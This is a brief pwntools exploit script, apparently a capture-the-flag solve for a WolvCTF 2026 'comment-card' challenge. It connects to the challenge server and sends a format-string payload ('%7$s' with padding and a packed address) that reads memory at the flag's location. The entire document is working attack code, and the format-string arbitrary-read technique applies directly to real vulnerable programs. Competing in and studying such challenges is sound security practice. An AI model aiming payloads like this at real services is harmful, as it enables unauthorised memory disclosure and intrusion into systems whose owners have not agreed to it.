from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

HOST, PORT = 'comment-card.wolvctf-2026.kctf.cloud', 1337
FLAG_ADDR = 0x404040

payload  = b'%7$s'
payload += b'AAAA'
payload += p64(FLAG_ADDR)

io = remote(HOST, PORT)
io.recvuntil(b'Leave your comment: ')
io.send(payload)
print(io.recvall(timeout=5).decode())
